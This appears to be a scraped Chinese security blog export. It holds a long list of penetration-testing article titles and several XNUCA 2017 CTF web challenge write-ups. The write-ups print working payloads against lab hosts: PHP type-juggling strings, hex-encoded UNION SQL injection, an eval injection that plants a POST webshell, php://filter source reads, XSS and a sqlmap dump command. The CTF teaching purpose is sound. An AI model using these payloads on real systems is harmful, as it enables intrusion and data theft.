逻辑至上——内含各种酷炫姿势 Web安全测试中常见逻辑漏洞解析（实战篇） 逻辑漏洞之密码重置 逻辑漏洞之支付漏洞 逻辑漏洞之越权访问 密码找回逻辑漏洞总结 一些常见的重置密码漏洞分析整理 密码逻辑漏洞小总结 漏洞挖掘之逻辑漏洞挖掘 tom0li: 逻辑漏洞小结 其他漏洞 未授权访问漏洞总结 未授权访问漏洞的检测与利用 Web之困笔记 常见Web源码泄露总结 Github信息泄露升级版案例 Hacking iSCSI 技术详解：基于Web的LDAP注入漏洞 RPO(relative path overwrite) 初探 Relative Path Overwrite Detecting and exploiting path-relative stylesheet import (PRSSI) vulnerabilities RPO A few RPO exploitation techniques Web Cache 浅析 Web Cache 欺骗攻击 redis 利用redis写webshell Redis 未授权访问配合 SSH key 文件利用分析 redis未授权访问漏洞利用总结。 【应急响应】redis未授权访问致远程植入挖矿脚本（防御篇） PHP相关弱类型 从弱类型利用以及对象注入到SQL注入 PHP中“＝＝”运算符的安全问题 PHP弱类型安全问题总结 浅谈PHP弱类型安全 php比较操作符的安全问题 随机数问题 PHP mt_rand()随机数安全 Cracking PHP rand() php里的随机数 php_mt_seed - PHP mt_rand() seed cracker The GLIBC random number generator 一道伪随机数的CTF题 伪协议 谈一谈php://filter的妙用 php 伪协议 利用 Gopher 协议拓展攻击面 PHP伪协议之 Phar 协议（绕过包含） PHP伪协议分析与应用 LFI、RFI、PHP封装协议安全问题学习 序列化 PHP反序列化漏洞 浅谈php反序列化漏洞 PHP反序列化漏洞成因及漏洞挖掘技巧与案例 php mail header injection What is Email Header Injection? PHP Email Injection Example 其他 对于Php Shell Bypass思路总结 Decrypt PHP’s eval based encryption with debugger Upgrade from LFI to RCE via PHP Sessions Xdebug: A Tiny Attack Surface Exploitable PHP functions 从WordPress SQLi谈PHP格式化字符串问题 php &amp; apache2 &amp;操作系统之间的一些黑魔法 php内存破坏漏洞exp编写和禁用函数绕过 挖掘PHP禁用函数绕过利用姿势 .user.ini文件构成的PHP后门 php代码审计 PHP漏洞挖掘——进阶篇 论PHP常见的漏洞 浅谈代码审计入门实战：某博客系统最新版审计之旅 ctf中的php代码审计技巧 PHP代码审计tips 代码审计之文件越权和文件上传搜索技巧 PHP代码审计入门集合 PHP代码审计学习 PHP漏洞挖掘思路+实例 PHP漏洞挖掘思路+实例 第二章 浅谈代码审计入门实战：某博客系统最新版审计之旅 PHP 代码审计小结 (一) 2018 PHP 应用程序安全设计指北 java-Web反序列 JavaJSON反序列化之殇看雪安全开发者峰会 从反射链的构造看Java反序列漏洞 Java反序列化漏洞从理解到实践 Java 序列化与反序列化安全分析 Java-Deserialization-Cheat-Sheet 如何攻击Java反序列化过程 深入理解JAVA反序列化漏洞 Attacking Java Deserialization jackson反序列化详细分析 Java安全之反序列化漏洞分析 fastjson 反序列化漏洞 POC 分析 Apache Commons Collections反序列化漏洞学习 Struct2 Struts2 命令执行系列回顾 java-Web代码审计 JAVA代码审计的一些Tips(附脚本) Java代码审计连载之—SQL注入 Java代码审计连载之—任意文件下载 Java代码审计连载之—XSS Java代码审计连载之—添油加醋 JAVA安全编码与代码审计.md Java代码审计PPT 其他 关于 JNDI 注入 层层放大java审计的攻击面 以Java的视角来聊聊SQL注入 站在Java的视角，深度分析防不胜防的小偷——“XSS” 你的 Java web 配置安全吗？ spring任意文件读取 在 Runtime.getRuntime().exec(String cmd) 中执行任意shell命令的几种方法 python-Web python web 安全总结 Defencely Clarifies Python Object Injection Exploitation Exploiting Python Deserialization Vulnerabilities Explaining and exploiting deserialization vulnerability with Python(EN) Python PyYAML反序列化漏洞实验和Payload构造 Python 格式化字符串漏洞（Django为例） format注入 Be Careful with Python’s New-Style String Format Python urllib HTTP头注入漏洞 Hack Redis via Python urllib HTTP Header Injection Python Waf黑名单过滤下的一些Bypass思路 Python沙箱逃逸的n种姿势 利用内存破坏实现Python沙盒逃逸 Python Sandbox Bypass pyt: 针对 Python 应用程序的源码静态分析工具 Exploiting Python PIL Module Command Execution Vulnerability 文件解压之过 Python中的代码执行 Node-js 浅谈Node.js Web的安全问题 node.js + postgres 从注入到Getshell Pentesting Node.js Application : Nodejs Application Security(需翻墙) 从零开始学习渗透Node.js应用程序 Node.js 中遇到含空格 URL 的神奇“Bug”——小范围深入 HTTP 协议 WAF相关 详谈WAF与静态统计分析 牛逼牛逼的payload和bypass总结 WAF绕过参考资料 浅谈WAF绕过技巧 addslashes防注入的绕过案例 浅谈json参数解析对waf绕过的影响 WAF攻防研究之四个层次Bypass WAF 使用HTTP头去绕过WAF 会找漏洞的时光机: Pinpointing Vulnerabilities 渗透测试Course Web Service 渗透测试从入门到精通 渗透标准 Penetration Testing Tools Cheat Sheet 信息收集 看我如何收集全网IP的whois信息 浅谈Web渗透测试中的信息收集 渗透测试教程：如何侦查目标以及收集信息？ 本屌的web漏洞扫描器思路 技巧总结（域名信息收集篇） 子域名的艺术 渗透测试向导之子域名枚举技术 实例演示如何科学的进行子域名收集 【渗透神器系列】搜索引擎 域渗透基础简单信息收集（基础篇） 内网渗透定位技术总结 后渗透攻防的信息收集 安全攻城师系列文章－敏感信息收集 子域名枚举的艺术 论二级域名收集的各种姿势 我眼中的渗透测试信息搜集 大型目标渗透－01入侵信息搜集 乙方渗透测试之信息收集 挖洞技巧：信息泄露之总结 渗透 【玩转Linux系统】Linux内网渗透 渗透测试指南之域用户组的范围 内网主机发现技巧补充 Linux 端口转发特征总结 内网渗透（持续更新） 实战 SSH 端口转发 多重转发渗透隐藏内网 内网转发姿势 内网转发的工具 Linux 下多种反弹 shell 方法 linux各种一句话反弹shell总结 php 反弹shell 利用ew轻松穿透多级目标内网 windows内网渗透杂谈 Windows域横向渗透 内网渗透中转发工具总结 内网渗透思路整理与工具使用 Cobalt strike在内网渗透中的使用 反向socks5代理(windows版) Windows渗透基础 通过双重跳板漫游隔离内网 A Red Teamer’s guide to pivoting 穿越边界的姿势 内网端口转发及穿透 秘密渗透内网——利用 DNS 建立 VPN 传输隧道 Reverse Shell Cheat Sheet 我所了解的内网渗透——内网渗透知识大总结 渗透实战 挖洞经验 | 看我如何综合利用4个漏洞实现GitHub Enterprise远程代码执行 Splash SSRF到获取内网服务器ROOT权限 Pivoting from blind SSRF to RCE with HashiCorp Consul 我是如何通过命令执行到最终获取内网Root权限的 信息收集之SVN源代码社工获取及渗透实战 SQL注入+XXE+文件遍历漏洞组合拳渗透Deutsche Telekom 渗透 Hacking Team 由视频系统SQL注入到服务器权限 From Serialized to Shell :: Exploiting Google Web Toolkit with EL Injection 浅谈渗透测试实战 渗透测试学习笔记之案例一 渗透测试学习笔记之案例二 渗透测试学习笔记之案例四 记一次内网渗透 提权 提权技巧 linux-kernel-exploits Linux平台提权漏洞集合 windows-kernel-exploits Windows平台提权漏洞集合 Linux MySQL Udf 提权 windows提权系列上篇 Windows提权系列中篇 获取SYSTEM权限的多种姿势 渗透技巧 乙方渗透测试之Fuzz爆破 域渗透神器Empire安装和简单使用 如何将简单的Shell转换成为完全交互式的TTY 60字节 - 无文件渗透测试实验 内网渗透思路探索之新思路的探索与验证 Web端口复用正向后门研究实现与防御 谈谈端口探测的经验与原理 端口渗透总结 端口扫描那些事 渗透技巧——通过cmd上传文件的N种方法 域渗透TIPS：获取LAPS管理员密码 域渗透——Security Support Provider 内网渗透随想 域渗透之流量劫持 渗透技巧——快捷方式文件的参数隐藏技巧 后门整理 Linux后门整理合集（脉搏推荐） 运维 安全运维那些洞 美团外卖自动化业务运维系统建设 饿了么运维基础设施进化史 nginx配置一篇足矣 Docker Remote API的安全配置 Apache服务器安全配置 IIS服务器安全配置 Tomcat服务器安全配置 互联网企业安全之端口监控 Linux应急响应姿势浅谈 黑客入侵应急分析手工排查 企业常见服务漏洞检测&amp;修复整理 Linux基线加固 Apache server security: 10 tips to secure installation Oracle数据库运维中的攻防实战（全） Linux服务器上监控网络带宽的18个常用命令DDOS DDoS攻防补遗 反射DDOS攻击防御的一点小想法 DDOS攻击方式总结 DDoS防御和DDoS防护方法 你帮忙看看这7个说法靠不靠谱 DDoS防御和DDoS防护 来看个人站长、果壳网和安全公司怎么说 DDoS防御之大流量DDoS防护方案 还有计算器估算损失 freeBuf专栏 遭受CC攻击的处理 CTF技巧总结 CTF线下防御战 — 让你的靶机变成“铜墙铁壁” ctf-wiki CTF中那些脑洞大开的编码和加密 CTF加密与解密 CTF中图片隐藏文件分离方法总结 Md5扩展攻击的原理和应用 CTF比赛中关于zip的总结 十五个Web狗的CTF出题套路 CTF备忘录 rcoil:CTF线下攻防赛总结 CTF内存取证入坑指南！稳！ 杂 细致分析Padding Oracle渗透测试全解析 Exploring Compilation from TypeScript to WebAssembly High-Level Approaches for Finding Vulnerabilities 谈谈HTML5本地存储——WebStorage Linux下容易被忽视的那些命令用法 各种脚本语言不同版本一句话开启 HTTP 服务器的总结 WebAssembly入门：将字节码带入Web世界 phpwind 利用哈希长度扩展攻击进行getshell 深入理解hash长度扩展攻击（sha1为例） Joomla 框架的程序执行流程及目录结构分析 如何通过恶意插件在Atom中植入后门]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[XNUCA 2017-Web专题赛前指导-php是最好的语言-writeup]]></title>
      <url>%2F2017%2F08%2F18%2FXNUCA-2017-Web%E4%B8%93%E9%A2%98%E8%B5%9B%E5%89%8D%E6%8C%87%E5%AF%BC-php%E6%98%AF%E6%9C%80%E5%A5%BD%E7%9A%84%E8%AF%AD%E8%A8%80-writeup%2F</url>
      <content type="text"><![CDATA[php弱类型比较strcmp、eregi 题目1http://218.76.35.75:20114/ Solution源代码如下:1234567891011121314151617181920212223242526272829303132&lt;?phpshow_source(__FILE__);$v1=0;$v2=0;$v3=0;$a=(array)json_decode(@$_GET['foo']);if(is_array($a))&#123; is_numeric(@$a["bar1"])?die("nope"):NULL; if(@$a["bar1"])&#123; ($a["bar1"]&gt;2016)?$v1=1:NULL; &#125; if(is_array(@$a["bar2"]))&#123; if(count($a["bar2"])!==5 OR !is_array($a["bar2"][0])) die("nope"); $pos = array_search("nudt", $a["a2"]); $pos===false?die("nope"):NULL; foreach($a["bar2"] as $key=&gt;$val)&#123; $val==="nudt"?die("nope"):NULL; &#125; $v2=1; &#125;&#125;$c=@$_GET['cat'];$d=@$_GET['dog'];if(@$c[1])&#123; if(!strcmp($c[1],$d) &amp;&amp; $c[1]!==$d)&#123; eregi("3|1|c",$d.$c[0])?die("nope"):NULL; strpos(($c[0].$d), "htctf2016")?$v3=1:NULL; &#125;&#125;if($v1 &amp;&amp; $v2 &amp;&amp; $v3)&#123; include "flag.php"; echo $flag;&#125;?&gt; 接下来逐步分析。目标是让v1，v2，v3都为 1，这样才能得到flag。 v112345678$a=(array)json_decode(@$_GET['foo']);if(is_array($a))&#123; is_numeric(@$a["bar1"])?die("nope"):NULL; if(@$a["bar1"])&#123; ($a["bar1"]&gt;2016)?$v1=1:NULL; &#125; ....&#125; 传入的foo，经过一次json_decode，然后转换成array。然后判断 $a[&quot;bar1&quot;] 是否满足 is_numeric，若满足则die掉。接下来又判断 $a[&quot;bar1&quot;] 是否大于 2016 。 利用php弱类型特性，可以设置1$a[&quot;bar1&quot;] = 2017a 这样is_numeric时会判断其为字符串而不是数字，而在与2016的比较中，会直接转换成2017，满足大于2016。这样 v1 就被设置为 1 了。 v2123456789if(is_array(@$a["bar2"]))&#123; if(count($a["bar2"])!==5 OR !is_array($a["bar2"][0])) die("nope"); $pos = array_search("nudt", $a["a2"]); $pos===false?die("nope"):NULL; foreach($a["bar2"] as $key=&gt;$val)&#123; $val==="nudt"?die("nope"):NULL; &#125; $v2=1;&#125; 接下来，要求$a[&quot;bar2&quot;]是个数组，其中元素的个数为5个（count($a[“bar2”])!==5），同时要求$a[&quot;bar2&quot;][0]是数组。所以我们设置:1$a[&quot;bar2&quot;] = [[],2,3,4,5] 对于 $pos = array_search(&quot;nudt&quot;, $a[&quot;a2&quot;]);，它搜索字符串“nudt”在$a[“a2”]中的位置。若没有找到，array_search返回false，会通过严格比较导致die掉。所以这里要设置：1$a[&quot;a2&quot;] = “nudt” 注意这里因为用了$pos===false?的严格比较，所以0不===false。 之后就能设置 v2 = 1 结合$a是由json_decode得来，所以第一个payload为：1foo=&#123;&quot;bar1&quot;:&quot;2017a&quot;,&quot;bar2&quot;:[[],2,3,4,5],&quot;a2&quot;:[&quot;nudt&quot;]&#125; v3123456789101112$c=@$_GET['cat'];$d=@$_GET['dog'];if(@$c[1])&#123; if(!strcmp($c[1],$d) &amp;&amp; $c[1]!==$d)&#123; eregi("3|1|c",$d.$c[0])?die("nope"):NULL; strpos(($c[0].$d), "htctf2016")?$v3=1:NULL; &#125;&#125;if($v1 &amp;&amp; $v2 &amp;&amp; $v3)&#123; include "flag.php"; echo $flag;&#125; 先会用strcmp进行比较，利用数组array和字符串进行strcmp比较会返回null，而且数组array也不会等于字符串，我们可以设置cat[1]为一个数组。 接下来用eregi对拼接后的字符串$d.$c[0]进行正则匹配，若匹配到则die掉。而下一步又要求拼接字符串$c[0].$d中要有字符串“htctf2016”。这里利用%00对eregi的截断功能，则在正则匹配eregi时在开头时就匹配结束掉。 strpos(($c[0].$d), &quot;htctf2016&quot;)中，还要求“htctf2016”不能出现在开头。 所以设置：123$d = %00 即 dog=%00$c[0] = &quot;ahtctf2016&quot; 所以综上所述，构造总的payload如下：1http://218.76.35.75:20114/?foo=&#123;&quot;bar1&quot;:&quot;2017e&quot;,&quot;bar2&quot;:[[],2,3,4,5],&quot;a2&quot;:[&quot;nudt&quot;]&#125;&amp;cat[0]=ahtctf2016&amp;cat[1][]=&amp;dog=%00 得到flag:1php_i5_n0t_b4d 后记题目已收录进：CTF-Web-Challenge-php：challenge-2]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[XNUCA 2017-Web专题赛前指导-vote-writeup]]></title>
      <url>%2F2017%2F08%2F18%2FXNUCA-2017-Web%E4%B8%93%E9%A2%98%E8%B5%9B%E5%89%8D%E6%8C%87%E5%AF%BC-vote-writeup%2F</url>
      <content type="text"><![CDATA[源码泄露、二次注入 题目123描述：据说可以注入，然而……http://218.76.35.75:65080/ Solution一个简单的投票功能。初步测试后没有回显，没有报错。在CTF中，越是简单越是没有提示的，往往都有源码泄露之类的。 源码泄露/恢复访问：1http://218.76.35.75:65080/.index.php.swp 下载下来，win下下下来后文件名变成了index.php.swp。用vim恢复文件。命令如下：1vim -r index.php 直接在vim中看可能不太方便，可以用下面的命令将其另存为：1w filename 得到恢复后的源码：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960&lt;?phpinclude 'db.php';session_start();if (!isset($_SESSION['login'])) &#123; $_SESSION['login'] = 'guest'.mt_rand(1e5, 1e6);&#125;$login = $_SESSION['login'];if (isset($_POST['submit'])) &#123; if (!isset($_POST['id'], $_POST['vote']) || !is_numeric($_POST['id'])) die('please select ...'); $id = $_POST['id']; $vote = (int)$_POST['vote']; if ($vote &gt; 5 || $vote &lt; 1) $vote = 1; $q = mysql_query("INSERT INTO t_vote VALUES (&#123;$id&#125;, &#123;$vote&#125;, '&#123;$login&#125;')"); $q = mysql_query("SELECT id FROM t_vote WHERE user = '&#123;$login&#125;' GROUP BY id"); echo '&lt;p&gt;&lt;b&gt;Thank you!&lt;/b&gt; Results:&lt;/p&gt;'; echo '&lt;table border="1"&gt;'; echo '&lt;tr&gt;&lt;th&gt;Logo&lt;/th&gt;&lt;th&gt;Total votes&lt;/th&gt;&lt;th&gt;Average&lt;/th&gt;&lt;/tr&gt;'; while ($r = mysql_fetch_array($q)) &#123; $arr = mysql_fetch_array(mysql_query("SELECT title FROM t_picture WHERE id = ".$r['id'])); echo '&lt;tr&gt;&lt;td&gt;'.$arr[0].'&lt;/td&gt;'; $arr = mysql_fetch_array(mysql_query("SELECT COUNT(value), AVG(value) FROM t_vote WHERE id = ".$r['id'])); echo '&lt;td&gt;'.$arr[0].'&lt;/td&gt;&lt;td&gt;'.round($arr[1],2).'&lt;/td&gt;&lt;/tr&gt;'; &#125; echo '&lt;/table&gt;'; echo '&lt;br&gt;&lt;a href="index.php"&gt;goBack&lt;/a&gt;&lt;br&gt;'; exit;&#125;?&gt;&lt;html&gt;&lt;head&gt; &lt;title&gt;Movie vote&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;p&gt;Welcome, Movie vote&lt;/p&gt;&lt;form action="index.php" method="POST"&gt;&lt;table border="1" cellspacing="5"&gt;&lt;tr&gt;&lt;?php$q = mysql_query('SELECT * FROM t_picture');while ($r = mysql_fetch_array($q)) &#123; echo '&lt;td&gt;&lt;img src="./images/'.$r['image'].'"&gt;&lt;div align="center"&gt;'.$r['title'].'&lt;br&gt;&lt;input type="radio" name="id" value="'.$r['id'].'"&gt;&lt;/div&gt;&lt;/td&gt;';&#125;?&gt;&lt;/tr&gt;&lt;/table&gt;&lt;p&gt;Your vote:&lt;select name="vote"&gt;&lt;option value="1"&gt;1&lt;/option&gt;&lt;option value="2"&gt;2&lt;/option&gt;&lt;option value="3"&gt;3&lt;/option&gt;&lt;option value="4"&gt;4&lt;/option&gt;&lt;option value="5"&gt;5&lt;/option&gt;&lt;/select&gt;&lt;/p&gt;&lt;input type="submit" name="submit" value="Submit"&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt; 二次注入注入点在这里：1if (!isset($_POST[&apos;id&apos;], $_POST[&apos;vote&apos;]) || !is_numeric($_POST[&apos;id&apos;])) post进的参数id，经过php的函数is_numeric()检测后，insert到数据库中；1$q = mysql_query(&quot;INSERT INTO t_vote VALUES (&#123;$id&#125;, &#123;$vote&#125;, &apos;&#123;$login&#125;&apos;)&quot;); 在完成投票后，根据id值将title取出来：123456$q = mysql_query(&quot;SELECT id FROM t_vote WHERE user = &apos;&#123;$login&#125;&apos; GROUP BY id&quot;);。。。$r = mysql_fetch_array($q)。。。$arr = mysql_fetch_array(mysql_query(&quot;SELECT title FROM t_picture WHERE id = &quot;.$r[&apos;id&apos;]));echo &apos;&lt;tr&gt;&lt;td&gt;&apos;.$arr[0].&apos;&lt;/td&gt;&apos;; 当我们传入经过十六进制转换的payload后，通过is_numeric()的检查，然后被插入到数据库中。而mysql将数据取出来时候会自动unhex一下，从而造成sql注入。 根据泄露出来的源码，我们推测表为 t_flag，字段为flag。我们要注入后的语句为：1SELECT title FROM t_picture WHERE id = -2 UNION SELECT GROUP_CONCAT(flag) FROM t_flag 这样因为不存在id为-2，从而能显示出flag。即payload为：12345hex(-2 UNION SELECT GROUP_CONCAT(flag) FROM t_flag) =&gt;0x2d322020554e494f4e2053454c4543542047524f55505f434f4e43415428666c6167292046524f4d20745f666c6167 flag:16yvt6eYziAHgVRKz3re]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[XNUCA 2017-Web专题赛前指导-最安全的笔记管理系统-writeup]]></title>
      <url>%2F2017%2F08%2F17%2FXNUCA-2017-Web%E4%B8%93%E9%A2%98%E8%B5%9B%E5%89%8D%E6%8C%87%E5%AF%BC-%E6%9C%80%E5%AE%89%E5%85%A8%E7%9A%84%E7%AC%94%E8%AE%B0%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-writeup%2F</url>
      <content type="text"><![CDATA[未完待续 题目123描述：没错，就是最安全的笔记管理系统，快来管理你的笔记吧~http://218.76.35.74:20128 访问后有一个登陆。用弱口令admin：admin可以进入。登陆后出现一个hint：./dbinit.sql 访问：1http://218.76.35.74:20128/dbinit.sql 得到如下信息：1234567891011121314151617181920212223242526272829303132333435363738CREATE DATABASE `taolu` DEFAULT CHARACTER SET utf8 COLLATE utf8_general_ci;drop table if exists `user`;create table `user`( `id` int(11) not null primary key auto_increment, `uname` varchar(20) not null, `password` varchar(32) not null, `level` tinyint not null)ENGINE=InnoDB DEFAULT CHARSET=utf8;drop table if exists `note`;create table `note` ( `id` int(11) not null primary key auto_increment, `content` varchar(255) not null, `title` varchar(255) not null, `userid` int(11) not null) ENGINE=InnoDB DEFAULT CHARSET=utf8 ;drop table if exists `page` ;create table `page` ( `num` varchar not null)ENGINE=InnoDB DEFAULT CHARSET=utf8;drop table if exists `flags`;create table `flags` ( `id` tinyint not null primary key , `flag` varchar(50) not null)ENGINE=InnoDB DEFAULT CHARSET=utf8;insert into `page` values (20);insert into `note` (title,content,userid)values( '测试笔记','这是管理员发布的测试笔记,个人无法删除(hint:./dbinit.sql)',1) 。。不过。。。还没想出来后面咋做。。。 后记此题为 2017 铁人三项地区资格赛-套路那么长 原题。]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[XNUCA 2017-Web专题赛前指导-default-writeup]]></title>
      <url>%2F2017%2F08%2F16%2FXNUCA-2017-Web%E4%B8%93%E9%A2%98%E8%B5%9B%E5%89%8D%E6%8C%87%E5%AF%BC-default-writeup%2F</url>
      <content type="text"><![CDATA[代码执行，闭合构造 题目：123描述：主页都没有了，就不要扫我了http://218.76.35.74:20131 Solution此时不扫更待何时。。。扫出一个 index2.php:12345678&lt;?phpinclude "flag2.php";error_reporting(0);show_source(__FILE__);$a = @$_REQUEST['hello'];eval("var_dump($a);"); 传入的参数会经过var_dump()，这里给出两种payload。 payload112345?hello=);eval($_POST[&apos;A&apos;]);%2f%2f或?hello=);eval(phpinfo());// var_dump($a);后的结果为1string(22) &quot;);eval($_POST[&apos;A&apos;]);//&quot; 即1eval(&quot;string(21) &quot;);eval($_GET[&apos;A&apos;]);//&quot;&quot;); payload21?hello=);eval($_GET[c]&amp;c=phpinfo(); var_dump()后的结果是1string(15) &quot;);eval($_GET[c]&quot; 即1eval(&quot;string(17) &quot;);eval($_GET[c]&quot; string(0) &quot;&quot; &quot;); 因此可以通过构造闭合引号。用菜刀连上： 真正的flag在flag1.php里。得到flag：1F8871804DD8C20C66D2386B3E51ADEC4 题外话已将此题收录进 CTF-Web-Challenge]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[XNUCA 2017-Web专题赛前指导-部分简单题汇总-writeup]]></title>
      <url>%2F2017%2F08%2F16%2FXNUCA-2017-Web%E4%B8%93%E9%A2%98%E8%B5%9B%E5%89%8D%E6%8C%87%E5%AF%BC-%E9%83%A8%E5%88%86%E7%AE%80%E5%8D%95%E9%A2%98%E6%B1%87%E6%80%BB-writeup%2F</url>
      <content type="text"><![CDATA[这些都是一些很简单的题。另有一些题会单独拿出来写。 捉迷藏1http://218.76.35.75:20111 查看源代码，发现链接：http://218.76.35.75:20111/Index.php得到flag：1th!5!5n0tth3fl@g 简单问答1http://218.76.35.75:20112 回答三个问题，答案如下：123456Q1) This is HT-CTF____&quot; : 2016Q2) Acronym for &quot;laughing out loud&quot; : lolQ3) Standard port for SSH : 22 首先用f12，将&lt;input type=&quot;submit&quot; disabled value=&quot;Submit Quiz&quot;&gt;中的disabled去掉。选择对应的选项，然后用burp截包，截取得到的post包数据如下：1q1=2015&amp;q2=lol+&amp;q4=22&amp;success=false 将2015改为2016，将lol+改为lol，将q4改为q3，将false改为true。如下：1q1=2016&amp;q2=lol&amp;q3=22&amp;success=true 发包，得到flag：1W3ll_d0n3 后台后台后台1http://218.76.35.75:20113/ 试着进入Admin Portal，同时用burp截包看看： 1234567891011121314POST / HTTP/1.1Host: 218.76.35.75:20113User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateReferer: http://218.76.35.75:20113/Cookie: PHPSESSID=lhempf2nd6m7oj4joinm11pmh7; User=JohnTan101; Member=Tm9ybWFsConnection: closeUpgrade-Insecure-Requests: 1Content-Type: application/x-www-form-urlencodedContent-Length: 17adminportal=Enter 其中Cookie字段中，User为JohnTan101，Member为Tm9ybWFs，用base64解码后为Normal。Forward掉后，页面返回提示：Only Member with Admin rights is allow to enter将Admin进行base64加密后得到QWRtaW4=，作为Member的值，发包，得到flag:1C00ki3_n0m_n0m_n0m php是最好的语言login1http://218.76.35.75:20115/ 进去后有三个功能：main显示主页，info显示phpinfo，login是登陆页面。访问时可以发现参数是page=main之类的。猜测有包含，可以利用php伪协议读取源码。12http://218.76.35.75:20115/?page=php://filter/read=convert.base64-encode/resource=login 得到login的源码如下:12345678910111213141516171819&lt;?php$login=@$_POST['login'];$password=@$_POST['password'];if(@$login=="admin" &amp;&amp; sha1(@$password)==$pwhash)&#123; include('flag.txt');&#125;else if (@$login&amp;&amp;@$password&amp;&amp;@$_GET['debug']) &#123; echo "Login error, login credentials has been saved to ./log/".htmlentities($login).".log"; $logfile = "./log/".$login.".log"; file_put_contents($logfile, $login."\n".$password);&#125;?&gt; &lt;center&gt; login&lt;br/&gt;&lt;br/&gt; &lt;form action="" method="POST"&gt; &lt;input name="login" placeholder="login"&gt;&lt;br/&gt; &lt;input name="password" placeholder="password"&gt;&lt;br/&gt;&lt;br/&gt; &lt;input type="submit" value="Go!"&gt; &lt;/form&gt; &lt;/center&gt; 另外读取到index.php的源码1http://218.76.35.75:20115/?page=php://filter/read=convert.base64-encode/resource=index 12345678910111213&lt;?php$pwhash="ffd313052dab00927cb61064a392f30ee454e70f";if (@$_GET['log']) &#123; if(file_exists($_GET['log'].".log"))&#123; include("flag.txt");&#125;&#125;if(@$_GET['page'] != 'index')&#123; include((@$_GET['page']?$_GET['page'].".php":"main.php"));&#125;?&gt; 我们先访问:123http://218.76.35.75:20115/?page=login&amp;debug=1POST: login=admin&amp;password=1 然后页面会返回：Login error, login credentials has been saved to ./log/admin.log 接着返回index.php，借助index.php里的这个log，就可以得到flag：1http://218.76.35.75:20115/?log=./log/admin 最后的flag为：110caL_File_1nc1usi0n_C@n_B3_fun http 头注入1http://218.76.35.75:20121/ test.tx123456789GET /heetian.php HTTP/1.1Host: 218.76.35.75:20121User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateReferer: http://218.76.35.75:20121/Connection: closeUpgrade-Insecure-Requests: 1 用sqlmap跑：1python sqlmap.py -r test.txt --level 3 -D ctfweb20110 -T flag --dump 得到flag：1Y0ugetT82f00000laev 简单的文件上传12描述：上传php 文件就给你flaghttp://218.76.35.75:20122 截断上传。flag：1Upl00d30668ss9h97aFil3 简单的JS1http://218.76.35.75:20123/ 查看源代码，将12p="60,105,102,114,97,109,101,32,104,101,105,103,1...12,34,62"p=eval("String.fromCharCode("+p+")"); 放到控制台里运行一下，得到如下结果：1&lt;iframe height=0 width=0 src=&quot;./fl0a.php&quot;&gt; 访问:1http://218.76.35.75:20123/fl0a.php 用burp查看返回包，在Cookie字段发现flag：1C00k1els60SecU5e php 是门松散的语言1http://218.76.35.75:20124/ 得到源代码，可知是变量覆盖问题，parse_str() 函数把查询字符串解析到变量中。1234567$he =&apos;goodluck&apos;;parse_str($_GET[&apos;heetian&apos;]);if $he = &apos;abcd&apos;;echo $flag; 访问：12http://218.76.35.75:20124/?heetian=he=abcd 得到flag：1C00d1uckf0rY0uuu 试试xss123描述：alert document.domainhttp://218.76.35.75:20125 fuzz一下，闭合前面的单引号：1#&apos; onerror=alert(document.domain) 得到flag:1D0Gum6Ntd0M11n 简单的文件包含123描述：Flag 在/flaghttp://218.76.35.75:20126 访问：1http://218.76.35.75:20126/index.php?page=/flag 查看源代码，得到：1flag: 62a72cb2f3d5e7fc0284da9f21e66c9f.php 访问：1http://218.76.35.75:20126/62a72cb2f3d5e7fc0284da9f21e66c9f.php 得到flag：1F11elNcLud3Get 简单的验证123描述：你不是amdin，没有权限查看flaghttp://218.76.35.75:20127 截包，看Cookie字段：1Cookie: user=Bob; guess=999 题目的提示错了，应该是admin。把Bob改为admin，然后guess用burp来爆破，得到flag：1EaSy70Ch1ngG00kie GG123描述：游戏似乎很无聊啊http://218.76.35.75:65380/ 访问后查看源代码，有个 tetris.js 。前端游戏这种，往往是在打通关之类的会给一些奇葩的提示或者直接出flag。对代码进行美化后，比如搜索gameover。找到：12345678910this.gameOver = function() &#123; b.stats.stop(); b.puzzle.stop(); document.getElementById(&quot;tetris-nextpuzzle&quot;).style.display = &quot;none&quot;; document.getElementById(&quot;tetris-gameover&quot;).style.display = &quot;block&quot;; if (this.highscores.mayAdd(this.stats.getScore())) &#123; var e = prompt(&quot;Game Over !\nEnter your name:&quot;, &quot;&quot;); e &amp;&amp; e.trim().length &amp;&amp; this.highscores.add(e, this.stats.getScore()) &#125;&#125;; 里面有mayAdd，找到一处：12345this.mayAdd = function(a) &#123; if (this.scores.length &lt; this.maxscores) return 1E6 &lt; a &amp;&amp; (a = new p, a.set("urlkey", "webqwer" [1] + "100.js", 864E5)), !0; for (var b = this.scores.length - 1; 0 &lt;= b; --b) if (this.scores[b].score &lt; a) return 1E6 &lt; a &amp;&amp; (a = new p, a.set("urlkey", "webqwer" [1] + "100.js", 864E5)), !0; return !1 &#125;; &quot;webqwer&quot; [1] + &quot;100.js&quot;，即e100.js。访问:1http://218.76.35.75:65380/e100.js 出现jsfuck编码，放到f12控制台里运行一下，得到flag：1oT0yTrjU0xhjhj2YTcT8jljMWpzS9tDk Reappear123描述：网管说他安装了什么编辑器，但是似乎不太会用。。。http://218.76.35.75:65180/ 访问后有提示：12Kindeditor v4.1.7something maybe in /kindeditor/ 网上有对应的信息泄露漏洞。访问：1http://218.76.35.75:65180/kindeditor/php/file_manager_json.php 